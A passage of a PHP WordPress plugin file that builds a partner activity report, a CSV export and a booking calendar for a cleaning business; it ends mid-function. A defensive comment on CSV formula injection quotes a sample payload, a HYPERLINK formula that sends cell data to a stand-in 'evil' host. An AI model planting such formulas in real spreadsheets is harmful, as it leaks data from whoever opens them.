<?php
/**
 * Partner Activity and Booking Calendar (admin).
 *
 * NB the name. This screen reports on affiliate *activity* — job counts, values,
 * tiers, trends. It is not the report library: that is the set of per-clean PDF photo
 * reports in includes/affiliate-job-reports.php, which partners download from their
 * account. The two were both called "Report Library" for a while and the confusion
 * cost real time, hence the split filenames.
 *
 * Both read the {prefix}jrc_jobs table via jrc_jobs_query(). The spec described
 * querying WooCommerce orders, but this site has none — cleans are not sold through
 * the site at all — so the job records are the only source of truth for what was
 * cleaned, for whom and when.
 *
 * The calendar is rendered server-side rather than with FullCalendar. A month grid is
 * a table; pulling in a 300KB dependency (and a CDN request) to draw one is not a
 * trade worth making, and this way it works without JavaScript and matches admin
 * styling for free. The REST route below exists so an external scheduling system, or a
 * richer front end later, has a clean feed to consume.
 *
 * @package jrc-partners
 */

if ( ! defined( 'ABSPATH' ) ) { exit; }

/** Capability for the reporting screens — matches the affiliate admin fields. */
function jrc_reports_cap() {
	return apply_filters( 'jrc_reports_capability', 'edit_users' );
}

/**
 * The Partner Programme menu.
 *
 * Registered at priority 9 — before ACF adds its options pages at 99 — so the parent
 * always exists by the time anything attaches to it. The reverse (hanging these off
 * ACF's own options-page menu) meant the submenus registered against a parent that did
 * not exist yet, and disappeared without any error.
 */
add_action( 'admin_menu', function () {
	$cap = jrc_reports_cap();

	add_menu_page(
		'Partner Programme',
		'Partner Programme',
		$cap,
		'jrc-partner',
		'jrc_render_activity_screen',
		'dashicons-groups',
		// 71.5, not 58. WooCommerce already owns 58 (Marketing), and a collision makes
		// WordPress shift the menu to an arbitrary decimal — it landed at 58.62423,
		// buried mid-way through the WooCommerce block where nobody thinks to look.
		// A unique float directly below Users is stable and is where account-related
		// admin belongs, since the affiliate data lives on user profiles.
		71.5
	);

	// Rename the auto-created first child so it doesn't read "Partner Programme" twice.
	add_submenu_page( 'jrc-partner', 'Partner Activity', 'Activity', $cap, 'jrc-partner', 'jrc_render_activity_screen' );
	add_submenu_page( 'jrc-partner', 'Booking Calendar', 'Booking Calendar', $cap, 'jrc-calendar', 'jrc_render_booking_calendar' );
}, 9 );

/** Filters shared by the report and the CSV export, read from the query string. */
function jrc_reports_filters() {
	// phpcs:disable WordPress.Security.NonceVerification.Recommended -- read-only filters.
	return array(
		'channel'    => isset( $_GET['channel'] ) ? sanitize_key( wp_unslash( $_GET['channel'] ) ) : '',
		'subtype'    => isset( $_GET['subtype'] ) ? sanitize_key( wp_unslash( $_GET['subtype'] ) ) : '',
		'status'     => isset( $_GET['status'] ) ? sanitize_text_field( wp_unslash( $_GET['status'] ) ) : '',
		'job_type'   => isset( $_GET['job_type'] ) ? sanitize_text_field( wp_unslash( $_GET['job_type'] ) ) : '',
		'user_id'    => isset( $_GET['affiliate'] ) ? (int) $_GET['affiliate'] : 0,
		'date_from'  => isset( $_GET['date_from'] ) ? sanitize_text_field( wp_unslash( $_GET['date_from'] ) ) : '',
		'date_to'    => isset( $_GET['date_to'] ) ? sanitize_text_field( wp_unslash( $_GET['date_to'] ) ) : '',
		'search'     => isset( $_GET['s'] ) ? sanitize_text_field( wp_unslash( $_GET['s'] ) ) : '',
		'orderby'    => isset( $_GET['orderby'] ) ? sanitize_key( wp_unslash( $_GET['orderby'] ) ) : 'job_date',
		'order'      => isset( $_GET['order'] ) && 'asc' === strtolower( wp_unslash( $_GET['order'] ) ) ? 'ASC' : 'DESC',
	);
	// phpcs:enable
}

/** Cached display bundle for an affiliate, so a 500-row table doesn't do 500 lookups. */
function jrc_report_account( $user_id ) {
	static $cache = array();
	if ( isset( $cache[ $user_id ] ) ) {
		return $cache[ $user_id ];
	}
	$u = get_userdata( $user_id );
	$p = $user_id ? jrc_affiliate_profile( $user_id ) : array();
	$cache[ $user_id ] = array(
		// User 0 is not a deleted account: it is work not matched to any partner yet
		// (JR's own jobs, or Connecteam shifts awaiting a Match).
		'name'    => ! $user_id ? 'Unassigned' : ( $u ? $u->display_name : '(deleted user #' . $user_id . ')' ),
		'channel' => $p['channel_label'] ?? '',
		'subtype' => $p['label'] ?? '',
		'tier'    => $user_id ? (int) get_user_meta( $user_id, 'jrc_affiliate_tier', true ) : 0,
		'code'    => $user_id ? (string) get_user_meta( $user_id, 'jrc_affiliate_code', true ) : '',
	);
	return $cache[ $user_id ];
}

/** Every approved affiliate, for the filter dropdown. */
function jrc_reports_affiliates() {
	return get_users( array( 'meta_key' => 'jrc_is_affiliate', 'meta_value' => '1', 'orderby' => 'display_name' ) );
}

// ---------------------------------------------------------------------------
// Partner Activity
// ---------------------------------------------------------------------------

function jrc_render_activity_screen() {
	if ( ! current_user_can( jrc_reports_cap() ) ) {
		wp_die( esc_html__( 'You do not have permission to view this page.', 'jrc-partners' ) );
	}

	$f       = jrc_reports_filters();
	$paged   = max( 1, isset( $_GET['paged'] ) ? (int) $_GET['paged'] : 1 ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
	$per     = 50;
	$args    = array_merge( $f, array( 'limit' => $per, 'offset' => ( $paged - 1 ) * $per ) );
	$rows    = jrc_jobs_query( $args );
	$total   = jrc_jobs_query( array_merge( $args, array( 'count_only' => true ) ) );

	// Totals across the whole filtered set, not just this page — a per-page total would
	// be actively misleading next to a pager.
	$all      = jrc_jobs_query( array_merge( $args, array( 'limit' => 10000, 'offset' => 0 ) ) );
	$sum      = 0.0;
	$done     = 0;
	$by_type  = array();
	foreach ( $all as $r ) {
		$sum += (float) $r->value;
		if ( 0 === strcasecmp( $r->status, 'Completed' ) ) { $done++; }
		$by_type[ $r->job_type ] = ( $by_type[ $r->job_type ] ?? 0 ) + 1;
	}
	arsort( $by_type );

	$sort_link = function ( $col, $label ) use ( $f ) {
		$next = ( $f['orderby'] === $col && 'ASC' === $f['order'] ) ? 'desc' : 'asc';
		$url  = add_query_arg( array_merge( $_GET, array( 'orderby' => $col, 'order' => $next ) ) ); // phpcs:ignore
		$mark = $f['orderby'] === $col ? ( 'ASC' === $f['order'] ? ' ▲' : ' ▼' ) : '';
		return '<a href="' . esc_url( $url ) . '">' . esc_html( $label ) . $mark . '</a>';
	};
	?>
	<div class="wrap">
		<h1>Partner Activity</h1>
		<p class="description">Job activity across every partner account. Filters apply to the totals and the CSV export as well as the table. Looking for the PDF photo reports? Those are attached per job on each partner's profile.</p>

		<form method="get" style="margin:16px 0;padding:14px;background:#fff;border:1px solid #dcdcde;border-radius:4px;">
			<input type="hidden" name="page" value="jrc-partner" />
			<div style="display:flex;flex-wrap:wrap;gap:10px;align-items:end;">
				<label>Channel<br />
					<select name="channel">
						<option value="">All</option>
						<?php foreach ( jrc_affiliate_subtypes() as $ch => $subs ) :
							$label = jrc_account_channel_name( $ch ); ?>
							<option value="<?php echo esc_attr( $ch ); ?>" <?php selected( $f['channel'], $ch ); ?>><?php echo esc_html( $label ); ?></option>
						<?php endforeach; ?>
					</select>
				</label>
				<label>Sub-type<br />
					<select name="subtype">
						<option value="">All</option>
						<?php foreach ( jrc_affiliate_subtypes() as $ch => $subs ) : foreach ( $subs as $slug => $def ) : ?>
							<option value="<?php echo esc_attr( $slug ); ?>" <?php selected( $f['subtype'], $slug ); ?>><?php echo esc_html( $def['label'] ); ?></option>
						<?php endforeach; endforeach; ?>
					</select>
				</label>
				<label>Affiliate<br />
					<select name="affiliate">
						<option value="0">All</option>
						<?php foreach ( jrc_reports_affiliates() as $u ) : ?>
							<option value="<?php echo (int) $u->ID; ?>" <?php selected( $f['user_id'], $u->ID ); ?>><?php echo esc_html( $u->display_name ); ?></option>
						<?php endforeach; ?>
					</select>
				</label>
				<label>Status<br />
					<select name="status">
						<option value="">All</option>
						<?php foreach ( array( 'Pending', 'Booked', 'Completed', 'Cancelled' ) as $st ) : ?>
							<option value="<?php echo esc_attr( $st ); ?>" <?php selected( $f['status'], $st ); ?>><?php echo esc_html( $st ); ?></option>
						<?php endforeach; ?>
					</select>
				</label>
				<label>Job type<br />
					<select name="job_type">
						<option value="">All</option>
						<?php foreach ( jrc_jobs_distinct( 'job_type' ) as $t ) : ?>
							<option value="<?php echo esc_attr( $t ); ?>" <?php selected( $f['job_type'], $t ); ?>><?php echo esc_html( $t ); ?></option>
						<?php endforeach; ?>
					</select>
				</label>
				<label>From<br /><input type="date" name="date_from" value="<?php echo esc_attr( $f['date_from'] ); ?>" /></label>
				<label>To<br /><input type="date" name="date_to" value="<?php echo esc_attr( $f['date_to'] ); ?>" /></label>
				<label>Search<br /><input type="search" name="s" value="<?php echo esc_attr( $f['search'] ); ?>" placeholder="address or scope" /></label>
				<button class="button button-primary">Filter</button>
				<a class="button" href="<?php echo esc_url( admin_url( 'admin.php?page=jrc-partner' ) ); ?>">Reset</a>
				<?php
				$csv = wp_nonce_url( add_query_arg( array_merge( $_GET, array( 'action' => 'jrc_export_jobs' ) ), admin_url( 'admin-post.php' ) ), 'jrc_export_jobs' ); // phpcs:ignore
				?>
				<a class="button" href="<?php echo esc_url( $csv ); ?>">Export CSV</a>
			</div>
		</form>

		<div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:14px;">
			<?php
			$cards = array(
				'Jobs (filtered)' => number_format_i18n( $total ),
				'Completed'       => number_format_i18n( $done ),
				'Total value'     => '£' . number_format( $sum, 2 ),
				'Most common'     => $by_type ? key( $by_type ) . ' (' . current( $by_type ) . ')' : '—',
			);
			foreach ( $cards as $label => $val ) : ?>
				<div style="background:#fff;border:1px solid #dcdcde;border-radius:4px;padding:12px 18px;min-width:150px;">
					<div style="font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#646970;"><?php echo esc_html( $label ); ?></div>
					<div style="font-size:20px;font-weight:600;"><?php echo esc_html( $val ); ?></div>
				</div>
			<?php endforeach; ?>
		</div>

		<?php
		// Response time and conversion. Deliberately NOT filtered by the form above:
		// these are programme health over a fixed 90 days, and a figure that moved every
		// time somebody changed a filter would be read as noise rather than a measure.
		$sla  = function_exists( 'jrc_job_sla_stats' ) ? jrc_job_sla_stats( array( 'days' => 90 ) ) : null;
		$conv = function_exists( 'jrc_quote_conversion_stats' ) ? jrc_quote_conversion_stats( array( 'days' => 90 ) ) : array();

		if ( ( $sla && $sla['sample'] ) || $conv ) : ?>
			<div style="display:flex;gap:14px;flex-wrap:wrap;margin-bottom:18px;align-items:flex-start;">

				<?php if ( $sla && ( $sla['sample'] || $sla['open'] ) ) : ?>
					<div style="background:#fff;border:1px solid #dcdcde;border-radius:4px;padding:12px 18px;min-width:280px;">
						<div style="font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#646970;">
							Request → confirmed, last 90 days
						</div>
						<?php if ( $sla['sample'] ) : ?>
							<div style="font-size:20px;font-weight:600;">
								<?php echo esc_html( jrc_job_duration_label( $sla['median_hours'] ) ); ?>
								<span style="font-size:12px;font-weight:400;color:#646970;">median</span>
							</div>
							<div style="font-size:12px;color:#646970;margin-top:2px;">
								Average <?php echo esc_html( jrc_job_duration_label( $sla['mean_hours'] ) ); ?> ·
								slowest <?php echo esc_html( jrc_job_duration_label( $sla['worst_hours'] ) ); ?> ·
								<?php echo (int) $sla['sample']; ?> confirmed
							</div>
						<?php else : ?>
							<div style="font-size:14px;color:#646970;margin-top:4px;">Nothing confirmed yet in this window.</div>
						<?php endif; ?>
						<?php if ( $sla['open'] ) : ?>
							<div style="font-size:12px;color:#8a6d00;font-weight:600;margin-top:4px;">
								<?php echo (int) $sla['open']; ?> still waiting on a confirmation
							</div>
						<?php endif; ?>
					</div>
				<?php endif; ?>

				<?php if ( $conv ) : ?>
					<div style="background:#fff;border:1px solid #dcdcde;border-radius:4px;padding:12px 18px;min-width:340px;">
						<div style="font-size:11px;text-transform:uppercase;letter-spacing:.06em;color:#646970;margin-bottom:6px;">
							Website enquiries → work, last 90 days
						</div>
						<table style="width:100%;font-size:12.5px;border-collapse:collapse;">
							<?php foreach ( $conv as $row ) :
								$name = 'unattributed' === $row['channel']
									? 'No referral code'
									: jrc_account_channel_name( $row['channel'] );
								?>
								<tr style="border-top:1px solid #f0f0f1;">
									<td style="padding:4px 0;"><?php echo esc_html( $name ); ?></td>
									<td style="padding:4px 0;text-align:right;color:#646970;">
										<?php echo (int) $row['converted']; ?>/<?php echo (int) $row['enquiries']; ?>
									</td>
									<td style="padding:4px 0 4px 12px;text-align:right;font-weight:600;">
										<?php echo esc_html( number_format( $row['rate'], 0 ) ); ?>%
									</td>
								</tr>
							<?php endforeach; ?>
						</table>
					</div>
				<?php endif; ?>

			</div>
		<?php endif; ?>

		<?php jrc_admin_pagination( $total, $per, $paged, 'top' ); ?>

		<table class="wp-list-table widefat fixed striped">
			<thead>
				<tr>
					<th style="width:12%"><?php echo wp_kses_post( $sort_link( 'user_id', 'Affiliate' ) ); ?></th>
					<th style="width:11%">Account type</th>
					<th style="width:8%"><?php echo wp_kses_post( $sort_link( 'job_date', 'Date' ) ); ?></th>
					<th style="width:9%"><?php echo wp_kses_post( $sort_link( 'scheduled_date', 'Scheduled' ) ); ?></th>
					<th style="width:11%"><?php echo wp_kses_post( $sort_link( 'job_type', 'Type' ) ); ?></th>
					<th style="width:15%"><?php echo wp_kses_post( $sort_link( 'address', 'Address' ) ); ?></th>
					<th>Scope</th>
					<th style="width:7%"><?php echo wp_kses_post( $sort_link( 'value', 'Value' ) ); ?></th>
					<th style="width:8%"><?php echo wp_kses_post( $sort_link( 'status', 'Status' ) ); ?></th>
				</tr>
			</thead>
			<tbody>
				<?php if ( ! $rows ) : ?>
					<tr><td colspan="9">No jobs match these filters.</td></tr>
				<?php endif; ?>
				<?php foreach ( $rows as $r ) :
					$acct = jrc_report_account( (int) $r->user_id ); ?>
					<tr>
						<td>
							<?php if ( (int) $r->user_id ) : ?>
								<a href="<?php echo esc_url( get_edit_user_link( $r->user_id ) ); ?>"><?php echo esc_html( $acct['name'] ); ?></a>
							<?php else : ?>
								<span style="color:#646970;">Unassigned</span>
								<?php
								if ( 'connecteam' === $r->source ) :
									/**
									 * The Match control for an unassigned imported job.
									 *
									 * Rendered by whichever integration imported it (jrc-connecteam
									 * opens its partner picker in place). This plugin only offers the
									 * slot, so it never depends on the integration being installed.
									 *
									 * @param object $r The job row.
									 */
									$match_ui = apply_filters( 'jrc_activity_match_control', '', $r );
									echo $match_ui ? '<br />' . $match_ui : ''; // phpcs:ignore WordPress.Security.EscapeOutput -- built and escaped by the integration.
								endif;
								?>
							<?php endif; ?>
							<?php if ( $acct['code'] ) : ?><br /><code style="font-size:11px"><?php echo esc_html( $acct['code'] ); ?></code><?php endif; ?>
						</td>
						<td>
							<?php echo esc_html( $acct['channel'] ); ?>
							<br /><span style="color:#646970"><?php echo esc_html( $acct['subtype'] ); ?><?php echo $acct['tier'] ? ' · Tier ' . (int) $acct['tier'] : ''; ?></span>
						</td>
						<td><?php echo esc_html( $r->job_date ? mysql2date( 'j M Y', $r->job_date ) : '—' ); ?></td>
						<td><?php echo esc_html( $r->scheduled_date ? mysql2date( 'j M Y H:i', $r->scheduled_date ) : '—' ); ?></td>
						<td>
							<?php echo esc_html( $r->job_type ); ?>
							<?php $meta_line = jrc_job_meta_summary( $r ); if ( $meta_line ) : ?>
								<br /><span style="font-size:11px;color:#646970"><?php echo esc_html( $meta_line ); ?></span>
							<?php endif; ?>
						</td>
						<td><?php echo esc_html( $r->address ); ?></td>
						<td style="font-size:12px;color:#50575e"><?php echo esc_html( wp_trim_words( (string) $r->scope, 18 ) ); ?></td>
						<td><?php echo esc_html( (float) $r->value ? '£' . number_format( (float) $r->value, 2 ) : '—' ); ?></td>
						<td><?php echo esc_html( $r->status ); ?></td>
					</tr>
				<?php endforeach; ?>
			</tbody>
		</table>

		<?php
		/** Lets an integration render shared UI once below the table (e.g. the Match picker). */
		do_action( 'jrc_activity_after_table', $rows );

		jrc_admin_pagination( $total, $per, $paged, 'bottom' );
		?>
	</div>
	<?php
}

/**
 * Neutralise a spreadsheet formula in an exported cell.
 *
 * Excel, LibreOffice and Google Sheets treat a cell opening with =, +, - or @ as a
 * formula, so an address of `=HYPERLINK("http://evil/"&A1,"Invoice")` runs the moment
 * whoever exported the CSV double-clicks it. Job rows are mostly staff-entered, but
 * jrc_job_upsert_external() exists to take rows straight from the scheduling system,
 * and CSV has no escaping of its own — quoting does not help, the formula still runs.
 *
 * A leading apostrophe is the standard defence: spreadsheets treat the rest of the
 * cell as literal text and do not display the apostrophe itself. Leading whitespace
 * is stripped first so ` =cmd` cannot slip past the check.
 */
function jrc_csv_cell( $value ) {
	$value = (string) $value;
	if ( '' === $value ) {
		return $value;
	}
	// A plain number is not a formula, and prefixing it would turn the Value column
	// into text — so a negative figure (a credit note) still exports as a number.
	if ( is_numeric( $value ) ) {
		return $value;
	}

	// Tab and carriage return are here because some parsers skip them before deciding
	// whether the cell is a formula.
	$trimmed = ltrim( $value, " \t\r\n" );
	if ( '' !== $trimmed && false !== strpos( '=+-@', $trimmed[0] ) ) {
		return "'" . $value;
	}
	return $value;
}

/** CSV export of the currently filtered view. */
add_action( 'admin_post_jrc_export_jobs', function () {
	if ( ! current_user_can( jrc_reports_cap() ) ) {
		wp_die( esc_html__( 'You do not have permission to export this data.', 'jrc-partners' ) );
	}
	check_admin_referer( 'jrc_export_jobs' );

	$rows = jrc_jobs_query( array_merge( jrc_reports_filters(), array( 'limit' => 10000, 'offset' => 0 ) ) );

	nocache_headers();
	header( 'Content-Type: text/csv; charset=utf-8' );
	header( 'Content-Disposition: attachment; filename=jr-cleaning-jobs-' . gmdate( 'Y-m-d' ) . '.csv' );

	$out = fopen( 'php://output', 'w' );

	// UTF-8 BOM: without it Excel on Windows reads the file as the system codepage and
	// mangles any accented name or address.
	fwrite( $out, "\xEF\xBB\xBF" );

	fputcsv( $out, array( 'Affiliate', 'Referral code', 'Channel', 'Sub-type', 'Tier', 'Date', 'Scheduled', 'Type', 'Address', 'Scope', 'Value', 'Status', 'Free bonus', 'Source' ) );
	foreach ( $rows as $r ) {
		$a = jrc_report_account( (int) $r->user_id );
		fputcsv( $out, array_map( 'jrc_csv_cell', array(
			$a['name'], $a['code'], $a['channel'], $a['subtype'], $a['tier'] ?: '',
			$r->job_date, $r->scheduled_date, $r->job_type, $r->address,
			preg_replace( '/\s+/', ' ', (string) $r->scope ),
			(float) $r->value ? number_format( (float) $r->value, 2, '.', '' ) : '',
			$r->status, jrc_free_bonus_label( $r->free_bonus ), $r->source,
		) ) );
	}
	fclose( $out );
	exit;
} );

// ---------------------------------------------------------------------------
// Booking Calendar
// ---------------------------------------------------------------------------

function jrc_render_booking_calendar() {
	if ( ! current_user_can( jrc_reports_cap() ) ) {
		wp_die( esc_html__( 'You do not have permission to view this page.', 'jrc-partners' ) );
	}

	// phpcs:disable WordPress.Security.NonceVerification.Recommended
	$view    = isset( $_GET['view'] ) && in_array( $_GET['view'], array( 'month', 'week', 'day' ), true ) ? sanitize_key( $_GET['view'] ) : 'week';
	$channel = isset( $_GET['channel'] ) ? sanitize_key( wp_unslash( $_GET['channel'] ) ) : '';
	$subtype = isset( $_GET['subtype'] ) ? sanitize_key( wp_unslash( $_GET['subtype'] ) ) : '';
	$field   = ( isset( $_GET['by'] ) && 'job_date' === $_GET['by'] ) ? 'job_date' : 'scheduled_date';
	// The day the view is anchored on. ?m=YYYY-MM (the old month links) still works.
	$anchor  = isset( $_GET['d'] ) ? strtotime( sanitize_text_field( wp_unslash( $_GET['d'] ) ) ) : false;
	if ( ! $anchor && isset( $_GET['m'] ) ) {
		$anchor = strtotime( sanitize_text_field( wp_unslash( $_GET['m'] ) ) . '-01' );
		$view   = isset( $_GET['view'] ) ? $view : 'month';
	}
	// phpcs:enable
	$today_ymd = current_time( 'Y-m-d' );
	$anchor    = $anchor ? $anchor : strtotime( $today_ymd );

	// The range each view covers, and where previous / next go.
	if ( 'month' === $view ) {
		$start = strtotime( gmdate( 'Y-m-01', $anchor ) );
		$end   = strtotime( '+1 month -1 day', $start );
		$prev  = strtotime( '-1 month', $start );
		$next  = strtotime( '+1 month', $start );
		$label = gmdate( 'F Y', $start );
	} elseif ( 'week' === $view ) {
		$start = strtotime( '-' . ( (int) gmdate( 'N', $anchor ) - 1 ) . ' days', $anchor );
		$end   = strtotime( '+6 days', $start );
		$prev  = strtotime( '-7 days', $start );
		$next  = strtotime( '+7 days', $start );
		$label = gmdate( 'j', $start ) . ( gmdate( 'M', $start ) !== gmdate( 'M', $end ) ? ' ' . gmdate( 'M', $start ) : '' ) . ' – ' . gmdate( 'j M Y', $end );
	} else {
		$start = $anchor;
		$end   = $anchor;
		$prev  = strtotime( '-1 day', $anchor );
		$next  = strtotime( '+1 day', $anchor );
		$label = gmdate( 'l j F Y', $anchor );
	}

	$jobs = jrc_jobs_query( array(
		'channel'    => $channel,
		'subtype'    => $subtype,
		'date_field' => $field,
		'date_from'  => gmdate( 'Y-m-d', $start ),
		'date_to'    => gmdate( 'Y-m-d', $end ),
		'limit'      => 3000,
		'orderby'    => $field,
		'order'      => 'ASC',
	) );

	$byday = array();
	foreach ( $jobs as $j ) {
		$raw = 'scheduled_date' === $field ? $j->scheduled_date : $j->job_date;
		if ( $raw ) {
			$byday[ gmdate( 'Y-m-d', strtotime( $raw ) ) ][] = $j;
		}
	}

	$base = admin_url( 'admin.php?page=jrc-calendar' );
	$keep = array( 'channel' => $channel, 'subtype' => $subtype, 'by' => $field );
	$url  = function ( $args ) use ( $base, $keep, $view, $anchor ) {
		return esc_url( add_query_arg( array_merge( $keep, array( 'view' => $view, 'd' => gmdate( 'Y-m-d', $anchor ) ), $args ), $base ) );
	};
	$colour = function ( $j ) {
		return 0 === strcasecmp( $j->status, 'Cancelled' ) ? '#d63638' : ( 0 === strcasecmp( $j->status, 'Completed' ) ? '#0c5f5c' : ( 0 === strcasecmp( $j->status, 'Pending' ) || 0 === strcasecmp( $j->status, 'Requested' ) ? '#dba617' : '#2271b1' ) );
	};
	$time = function ( $j ) use ( $field ) {
		if ( 'scheduled_date' !== $field || ! $j->scheduled_date ) {
			return '';
		}
		return mysql2date( 'H:i', $j->scheduled_date ) . ( ! empty( $j->scheduled_end ) ? '–' . mysql2date( 'H:i', $j->scheduled_end ) : '' );
	};
	$place = function ( $j ) {
		$m = jrc_job_meta( $j );
		return trim( (string) ( ( $m['building'] ?? '' ) ?: ( ( $m['shift_title'] ?? '' ) ?: $j->address ) ) );
	};
	$event = function ( $j, $compact ) use ( $colour, $time, $place ) {
		$a  = jrc_report_account( (int) $j->user_id );
		$t  = $time( $j );
		$pl = $place( $j );
		$title = trim( $j->job_type . ' — ' . $a['name'] . "\n" . $j->address . "\n" . jrc_job_meta_summary( $j ) . "\n" . $j->status );
		echo '<div class="jrc-cal-ev" title="' . esc_attr( $title ) . '" style="border-left-color:' . esc_attr( $colour( $j ) ) . '">';
		if ( $compact ) {
			echo '<span class="jrc-cal-ev__t">' . esc_html( $t ? strtok( $t, '–' ) : '' ) . '</span> ' . esc_html( $pl ?: $j->job_type );
		} else {
			echo ( $t ? '<strong>' . esc_html( $t ) . '</strong> ' : '' ) . esc_html( $j->job_type );
			echo '<br /><span class="jrc-cal-ev__who">' . esc_html( $a['name'] ) . '</span>';
			if ( $pl ) {
				echo '<br /><span class="jrc-cal-ev__pl">' . esc_html( wp_trim_words( $pl, 8 ) ) . '</span>';
			}
		}
		echo '</div>';
	};
	?>
	<div class="wrap">
		<h1>Booking Calendar</h1>
		<p class="description">
			Cleans by <?php echo 'scheduled_date' === $field ? 'scheduled slot' : 'job date'; ?>.
			Jobs without a <?php echo 'scheduled_date' === $field ? 'scheduled slot' : 'date'; ?> do not appear. Hover a clean for its details.
		</p>

		<style>
			.jrc-cal-bar { display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin:14px 0; }
			.jrc-cal-bar h2 { margin:0 8px; font-size:20px; }
			.jrc-cal-views { display:inline-flex; }
			.jrc-cal-views .button { border-radius:0; margin-left:-1px; }
			.jrc-cal-views .button:first-child { border-radius:3px 0 0 3px; margin-left:0; }
			.jrc-cal-views .button:last-child { border-radius:0 3px 3px 0; }
			.jrc-cal-count { color:#646970; font-size:13px; }
			.jrc-cal-grid { table-layout:fixed; background:#fff; }
			.jrc-cal-grid td { vertical-align:top; }
			.jrc-cal-day { font-weight:600; font-size:12px; color:#646970; text-decoration:none; }
			.jrc-cal-day.is-today { color:#2271b1; }
			.jrc-cal-ev { margin-top:4px; padding:3px 6px; border-left:3px solid #2271b1; background:#f6f7f7; font-size:11.5px; line-height:1.35; overflow:hidden; }
			.jrc-cal-grid--month .jrc-cal-ev { white-space:nowrap; text-overflow:ellipsis; }
			.jrc-cal-ev__t { font-weight:600; }
			.jrc-cal-ev__who { color:#646970; }
			.jrc-cal-ev__pl { color:#8c8f94; font-style:italic; }
			.jrc-cal-more { display:inline-block; margin-top:4px; font-size:11.5px; }
			.jrc-cal-grid--week td { min-height:300px; height:300px; }
			.jrc-cal-chips { display:flex; gap:8px; flex-wrap:wrap; margin:0 0 12px; }
			.jrc-cal-chip { background:#fff; border:1px solid #dcdcde; border-left-width:4px; border-radius:3px; padding:4px 10px; font-size:12px; }
		</style>

		<form method="get" style="margin:14px 0;display:flex;gap:10px;align-items:end;flex-wrap:wrap;">
			<input type="hidden" name="page" value="jrc-calendar" />
			<input type="hidden" name="view" value="<?php echo esc_attr( $view ); ?>" />
			<input type="hidden" name="d" value="<?php echo esc_attr( gmdate( 'Y-m-d', $anchor ) ); ?>" />
			<label>Channel<br />
				<select name="channel">
					<option value="">All</option>
					<?php foreach ( jrc_affiliate_subtypes() as $ch => $subs ) : ?>
						<option value="<?php echo esc_attr( $ch ); ?>" <?php selected( $channel, $ch ); ?>><?php echo esc_html( jrc_account_channel_name( $ch ) ); ?></option>
					<?php endforeach; ?>
				</select>
			</label>
			<label>Sub-type<br />
				<select name="subtype">
					<option value="">All</option>
					<?php foreach ( jrc_affiliate_subtypes() as $subs ) : foreach ( $subs as $slug => $def ) : ?>
						<option value="<?php echo esc_attr( $slug ); ?>" <?php selected( $subtype, $slug ); ?>><?php echo esc_html( $def['label'] ); ?></option>
					<?php endforeach; endforeach; ?>
				</select>
			</label>
			<label>Show by<br />
				<select name="by">
					<option value="scheduled_date" <?php selected( $field, 'scheduled_date' ); ?>>Scheduled slot</option>
					<option value="job_date" <?php selected( $field, 'job_date' ); ?>>Job date</option>
				</select>
			</label>
			<button class="button">Apply</button>
		</form>

		<div class="jrc-cal-bar">
			<span class="jrc-cal-views" role="group" aria-label="Calendar view">
				<?php foreach ( array( 'month' => 'Month', 'week' => 'Week', 'day' => 'Day' ) as $v => $vl ) : ?>
					<a class="button<?php echo $v === $view ? ' button-primary' : ''; ?>" href="<?php echo $url( array( 'view' => $v ) ); // phpcs:ignore WordPress.Security.EscapeOutput -- esc_url in closure. ?>" <?php echo $v === $view ? 'aria-current="page"' : ''; ?>><?php echo esc_html( $vl ); ?></a>
				<?php endforeach; ?>
			</span>
			<a class="button" href="<?php echo $url( array( 'd' => gmdate( 'Y-m-d', $prev ) ) ); // phpcs:ignore WordPress.Security.EscapeOutput ?>" aria-label="Previous">&larr;</a>
			<a class="button" href="<?php echo $url( array( 'd' => $today_ymd ) ); // phpcs:ignore WordPress.Security.EscapeOutput ?>">Today</a>
			<a class="button" href="<?php echo $url( array( 'd' => gmdate( 'Y-m-d', $next ) ) ); // phpcs:ignore WordPress.Security.EscapeOutput ?>" aria-label="Next">&rarr;</a>
			<h2><?php echo esc_html( $label ); ?></h2>
			<span class="jrc-cal-count"><?php echo esc_html( number_format_i18n( count( $jobs ) ) . ' ' . _n( 'job', 'jobs', count( $jobs ), 'jrc-partners' ) ); ?></span>
		</div>

		<?php if ( 'day' === $view ) :
			$list = $byday[ gmdate( 'Y-m-d', $anchor ) ] ?? array();
			$by_status = array();
			foreach ( $list as $j ) {
				$by_status[ $j->status ?: '—' ][] = $j;
			}
			?>
			<?php if ( $by_status ) : ?>
				<div class="jrc-cal-chips">
					<?php foreach ( $by_status as $st => $js ) : ?>
						<span class="jrc-cal-chip" style="border-left-color:<?php echo esc_attr( $colour( $js[0] ) ); ?>"><?php echo esc_html( $st . ': ' . count( $js ) ); ?></span>
					<?php endforeach; ?>
				</div>
			<?php endif; ?>
			<table class="wp-list-table widefat fixed striped">
				<thead><tr>
					<th style="width:110px">Time</th><th style="width:15%">Type</th><th style="width:15%">Partner</th><th>Building / shift</th><th style="width:20%">Address</th><th style="width:60px">Staff</th><th style="width:90px">Status</th><th style="width:80px">Value</th>
				</tr></thead>
				<tbody>
					<?php if ( ! $list ) : ?>
						<tr><td colspan="8">No cleans on this day.</td></tr>
					<?php endif; ?>
					<?php foreach ( $list as $j ) :
						$a = jrc_report_account( (int) $j->user_id );
						$m = jrc_job_meta( $j );
						?>
						<tr>
							<td><strong><?php echo esc_html( $time( $j ) ?: '—' ); ?></strong></td>
							<td><?php echo esc_html( $j->job_type ); ?></td>
							<td>
								<?php if ( (int) $j->user_id ) : ?><a href="<?php echo esc_url( get_edit_user_link( $j->user_id ) ); ?>"><?php echo esc_html( $a['name'] ); ?></a><?php else : ?><span style="color:#646970">Unassigned</span><?php endif; ?>
							</td>
							<td><?php echo esc_html( ( $m['building'] ?? '' ) ?: ( $m['shift_title'] ?? '—' ) ); ?></td>
							<td><?php echo esc_html( $j->address ?: '—' ); ?></td>
							<td><?php echo isset( $m['staff_count'] ) ? (int) $m['staff_count'] : '—'; ?></td>
							<td><span style="border-left:3px solid <?php echo esc_attr( $colour( $j ) ); ?>;padding-left:6px;"><?php echo esc_html( $j->status ); ?></span></td>
							<td><?php echo esc_html( (float) $j->value ? '£' . number_format( (float) $j->value, 2 ) : '—' ); ?></td>
						</tr>
					<?php endforeach; ?>
				</tbody>
			</table>

		<?php else :
			// Month and week share the Monday-first grid; the month caps each day at
			// four lines and links the rest through to that day.
